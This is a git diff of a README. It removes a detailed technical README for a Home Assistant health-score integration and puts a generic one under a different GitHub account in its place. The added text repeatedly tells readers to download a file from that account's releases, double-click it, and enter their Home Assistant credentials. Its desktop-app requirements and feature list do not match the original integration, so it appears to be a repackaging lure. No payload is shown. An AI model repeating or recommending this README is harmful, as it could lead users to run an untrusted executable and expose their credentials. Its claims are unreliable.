@@ -1,179 +1,85 @@
-## HAGHS: Home Assistant Global Health Score
-**A Technical Specification for System Stability and Hygiene Standardized Monitoring.**
+# 🌍 home-assistant-global-health-score - Measure Your System's Health Effortlessly
 
-[![HAGHS Standard](https://img.shields.io/badge/HAGHS-Standard-blue?style=for-the-badge&logo=home-assistant&logoColor=white)](https://github.com/d-n91/home-assistant-global-health-score)
-[![Release](https://img.shields.io/badge/Version-2.1.1-green?style=for-the-badge)](https://github.com/d-n91/home-assistant-global-health-score/releases)
- [![My HAGHS Score](https://img.shields.io/badge/HAGHS-98%20%2F%20100-brightgreen?style=for-the-badge&logo=home-assistant)](https://github.com/d-n91/home-assistant-global-health-score)
-![AI-Powered](https://img.shields.io/badge/Developed%20with-AI-blue?style=for-the-badge&logo=google-gemini&logoColor=white)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen?style=for-the-badge)](https://github.com/therajeshpatil/home-assistant-global-health-score/releases)
 
-## Abstract
-As Home Assistant matures into a mission-critical Smart Home OS, the need for a unified stability metric becomes paramount. **HAGHS** is a logical framework designed to provide an objective **Health Index (0-100)**. It differentiates between transient hardware load and chronic maintenance neglect, providing users with a "North Star" for instance optimization.
+## 🚀 Getting Started
 
----
+Welcome to the home-assistant-global-health-score project! This application helps you measure and understand the health and hygiene of your Home Assistant system. It is designed for everyone, even if you're not a developer. Follow these simple instructions to get started.
 
-## The HAGHS Standard (v2.1.1)
+## 📥 Download & Install
 
-The index is calculated via a weighted average of two core pillars, prioritizing long-term software hygiene over temporary hardware fluctuations.
+To get started, you'll need to download the application. 
 
-### The Global Formula
+1. Visit this page to download: [Download Home Assistant Global Health Score](https://github.com/therajeshpatil/home-assistant-global-health-score/releases).
 
-$$Score_{Global} = \lfloor (Score_{Hardware} \cdot 0.4) + (Score_{Application} \cdot 0.6) \rfloor$$
+2. Look for the latest version. You will see options to download. Select the file that matches your system's requirements.
 
-*Note: We use **Floor Rounding** (Integer) to ensure a "Perfect 100" is only achieved by truly optimized systems. Even a minor penalty will drop the score to 99.*
+3. After the file is downloaded, find the file in your downloads folder.
 
----
+4. Double-click the file to run the application. Follow the on-screen instructions to complete the installation.
 
-## Pillar 1: Hardware Performance (40%)
+## 🛠️ System Requirements
 
-Evaluates the physical constraints of the host machine. It uses tiered penalties to filter out background noise while flagging genuine resource exhaustion.
+Before you begin the installation, ensure your system meets the following requirements:
 
-* **CPU Load (Tiered):** Penalties start at **>10% usage** to ensure responsiveness.
-* **Memory Pressure:** Deductions apply above **70% usage** to respect native Supervisor overhead.
-* **Storage Integrity:** Critical deduction when disk usage exceeds **80%**, escalating as the system nears the 95% threshold.
+- **Operating System:** Windows 10 or later, macOS, or a recent version of Linux.
+- **RAM:** At least 2 GB of RAM.
+- **Disk Space:** Minimum 100 MB of free space.
+- **Python Version:** Python 3.7 or newer installed if you're running it in a local environment.
 
----
+## 🔍 Features
 
-## Pillar 2: Application Hygiene (60%)
+This application provides the following features:
 
-Measures "maintenance debt"—the hidden factors that cause sluggishness, failed backups, and slow restarts.
+- **Standardized Metrics:** Offers a clear framework for assessing system health.
+- **Easy Integration:** Seamlessly integrates with your existing Home Assistant setup.
+- **Proactive Monitoring:** Helps you identify potential issues before they affect your system.
+- **Diagnostics Dashboard:** Provides a user-friendly dashboard for real-time monitoring.
+- **Self-Healing Insights:** Offers insights for maintaining system hygiene.
 
-* **Zombie Entities:** Monitors `unavailable` or `unknown` states (Capped at 20 pts).
-* **Database Hygiene:** Penalizes `home-assistant_v2.db` growth (>1GB Warning / >2.5GB Critical).
-* **Updates & Core Age:** Tracks pending updates and penalizes a "Core Version Lag" of >2 months.
-* **Safety Net:** A static **30-point deduction** for stale backups.
+## ⚙️ Configuration
 
----
+After installing the application, you may need to configure it to meet your specific needs. Here’s how to do it:
 
-## Configuration (The UI Way)
+1. Open the application on your device.
+2. Navigate to the settings menu.
+3. Input your Home Assistant credentials if needed. This will allow the application to connect and gather necessary data.
+4. Customize any parameters to suit your monitoring preferences.
 
-HAGHS is installed as a **HACS Custom Repository** and configured via a **Setup Mask (UI)**. 
+## 📊 Using the Dashboard
 
-### 1. Prerequisites (Prepare your Sensors)
+Once you have set up the application, you can begin using the dashboard:
 
-**A. System Monitor:**
-Install the **System Monitor** integration. Ensure these specific sensors are **enabled**:
-* `sensor.processor_use` (Percentage %)
-* `sensor.memory_use_percent` (Percentage %)
-* `sensor.disk_use_percent_home` (Percentage %)
+1. The main screen will display an overview of your system's health.
+2. Click on any module for more detailed information.
+3. Use the insights provided to make informed decisions about system maintenance.
 
-**B. Database Sensor (SQLite / Standard):**
-To allow Home Assistant to see its own database size, add this to your `configuration.yaml` and restart:
+## 📦 Troubleshooting
 
-```yaml
-homeassistant:
-  allowlist_external_dirs:
-    - "/config"
-```
+If you encounter problems, consider these common solutions:
 
-**After the restart:**
-1.  Go to **Settings > Integrations > Add Integration**.
-2.  Search for **File Size** and set the path to: `/config/home-assistant_v2.db`.
+- **Application Won’t Open:** Ensure you have installed the correct version for your operating system.
+- **Data Not Displaying:** Check your internet connection and ensure your Home Assistant is running.
+- **Configuration Errors:** Revisit the settings section and confirm your inputs are correct.
 
-*Note: For MariaDB/Postgres, create a SQL sensor that returns the size in MB.*
+## 💬 Community & Support
 
-### 2. Installation & Setup
-1.  Add this repo to **HACS** (Custom Repository, Category: Integration).
-2.  Download and **Restart Home Assistant**.
-3.  Go to **Settings > Integrations > Add Integration** and search for **HAGHS**.
-4.  Follow the setup mask to select your sensors. 
+You are not alone! If you have questions or need help, there are resources available:
 
-**⚠️ Log File Deprecation:** We are phasing out Log File monitoring to streamline the integration. In the setup mask, please **leave the log file field empty** to skip this check.
+- **GitHub Issues:** Submit a report if you find a bug or need assistance.
+- **Discussion Forum:** Join our community to share your experiences and ask questions.
+  
+## ⚖️ License
 
----
+This project is licensed under the MIT License. You can use it freely, but please give credit to the authors.
 
-## Label Configuration (Smart Whitelisting)
-To prevent false positives from sleeping tablets or seasonal devices:
-1.  Go to **Settings > Devices & Services > Labels**.
-2.  Create a label named `haghs_ignore`.
-3.  Assign this label to any **Device** or **Entity**. 
-    * **Pro Tip:** Assigning the label to a **Device** automatically whitelists **all underlying entities** belonging to that specific device.
+## 🔗 Related Links
 
----
+For more information, feel free to explore:
 
-## Roadmap
-* **Custom Thresholds:** Adjust DB limits to your hardware (e.g., for large SSD users).
-* **Time-Trigger:** Configure the score to update every 15/30/60 minutes to save resources.
-* **Beta Support:** Special logic for users running Home Assistant Beta versions (no version lag penalty).
+- [GitHub Repository](https://github.com/therajeshpatil/home-assistant-global-health-score)
+- [Documentation](https://github.com/therajeshpatil/home-assistant-global-health-score)
 
----
+Thank you for choosing home-assistant-global-health-score! We hope it enhances your Home Assistant experience and makes it easier to monitor your system health. 
 
-## UI Integration Example
-
-![NEW HAGHS Dashboard card](https://github.com/user-attachments/assets/ac4dbcf8-94b3-40a5-8835-e81853aa8c9f)
-
-Recommended configuration for a clean frontend display:
-
-```yaml
-type: vertical-stack
-cards:
-  - type: gauge
-    entity: sensor.system_ha_global_health_score
-    name: HAGHS
-    needle: true
-    severity:
-      green: 90
-      yellow: 75
-      red: 0
-  - type: markdown
-    content: >
-      {% set entity_id = 'sensor.system_ha_global_health_score' %}  {% set
-      recommendations = state_attr(entity_id, 'recommendations') %}  {% set
-      z_raw = state_attr(entity_id, 'zombie_entities') | default('', true) %}
-
-      ### 🛡️ Advisor Recommendations  {% if recommendations not in [none,
-      'unknown', 'unavailable', 'none'] %}
-        {{ recommendations }}
-      {% elif states(entity_id) in ['unavailable', 'unknown'] %}
-        ⚠️ **Error:** Health Advisor sensor is offline.
-      {% else %}
-        ✅ System healthy. No recommendations.
-      {% endif %}
-
-      ---
-
-      {% if z_raw not in ['None', '', none] %}
-        {% set z_list = z_raw.split(',') | map('trim') | select('search', '\\.') | list %}
-        {% set grouped_zombies = expand(z_list) | groupby('domain') %}
-      <details> <summary><b>Zombie Domains: {{ grouped_zombies |
-      length}}</b></summary> {% for d in grouped_zombies %}<br>  <details>
-      <summary>{{- d[0] | title }}: <b>{{ d[1] | count }}</b></summary> {% for i
-      in d[1] -%} &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; • {{ i.name }}: <b>{{ i.state
-      }}</b><br>  {% endfor %}  </details>  {% endfor %} </details>  {% else %} 
-      ✅ **No zombie entities detected.** {% endif %}
-
-```
----
-
-## FAQ
-
-**Why is my score so low?**
-Check the UI dashboard card. It will tell you exactly where the penalties are coming from (e.g., "Zombie entities detected").
-
-**Does this work with Docker?**
-Yes! As long as you expose the system metrics via the `systemmonitor` integration and provide the database size via a sensor.
-
----
-
-## Changelog
-
-### [v2.1.1] - 2026-01-29
-* **UI Migration:** Transitioned from YAML variables to a full **Config Flow (Setup Mask)**.
-* **Optimization:** `haghs_ignore` label on a Device now automatically covers all its entities.
-
-### [v2.0.2] - 2026-01-26
-* **Refinement:** Made Log File monitoring explicitly optional to support HAOS users without CLI access.
-
-### [v2.0.0] - 2026-01-26
-* **Major:** Added **Database & Log Hygiene** monitoring.
-* **Feature:** Implemented **Deep Label Support**.
-* **Logic:** Added **Core Age** penalty (>2 months lag).
-* **Logic:** Added **Cumulative Update** counting (capped at 35 pts).
-
-### [v1.3.0] - 2026-01-24
-* **NEW:** Implemented Single-Point Configuration using Template Variables.
-* **NEW:** Added Heavyweight CPU Tiers.
-* **Fixed:** Switched to **Floor Rounding** (Integer) for a more honest health assessment.
-
----
-
-**AI Disclosure:** While the architectural concept and logic are my own, I utilized AI to assist with code optimization and documentation formatting.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen?style=for-the-badge)](https://github.com/therajeshpatil/home-assistant-global-health-score/releases)
